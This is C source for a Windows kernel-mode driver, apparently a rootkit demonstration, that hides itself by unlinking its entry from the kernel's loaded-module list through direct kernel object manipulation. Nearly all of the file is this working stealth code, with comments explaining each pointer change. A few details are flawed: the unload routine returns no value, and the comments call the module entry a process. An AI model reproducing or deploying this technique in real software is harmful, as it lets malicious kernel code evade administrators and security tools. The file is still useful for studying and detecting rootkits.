#include <ntddk.h>
#include "ldr_data_table.h" // header containing data table entry structure which is crucial for this project

/*
	
	KERNEL MODE DRIVER ABLE TO HIDE ITSELF BY USING DIRECT KERNEL OBJECT MANIPULATION.

	MADE BY NBQ

*/

PDEVICE_OBJECT pDeviceObject;
UNICODE_STRING rDevices, rDosDevices;

VOID HideDriver(PDRIVER_OBJECT pDriverObject)
{
	KIRQL irql = KeRaiseIrqlToDpcLevel(); // raises IRQL to DISPATCH level
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
	modEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;
	// changing pointers of previous and next process in the list to point around our Driver process
	// this means our Driver process will be skipped when a different program tries enumerating the list
	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;
	// changing our flink and blink pointers to point to our Driver process
	// this is done just to not have any loose ends and accidentally blue screen
	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
	// once everything is done we lower the IRQL level back to normal
	KeLowerIrql(irql); 
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriverObject) // simple unload routine
{
	DbgPrintEx(0, 0, "Unloading HideDriver!\n");
	IoDeleteSymbolicLink(&rDosDevices);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath) // DriverEntry() - its like main() for drivers
{
	HideDriver(pDriverObject); // simply call the HideDriver() function and pass it DriverObject

	DbgPrintEx(0, 0, "HideDriver Loaded!\n");

	// registering the driver, not necessary for HideDriver() function to work
	RtlInitUnicodeString(&rDevices, L"\\Device\\HideDriver");
	RtlInitUnicodeString(&rDosDevices, L"\\DosDevices\\HideDriver");

	IoCreateSymbolicLink(&rDosDevices, &rDevices);

	// registering an unload function to be able to unload the driver at will
	pDriverObject->DriverUnload = UnloadDriver;
	
	return STATUS_SUCCESS;
}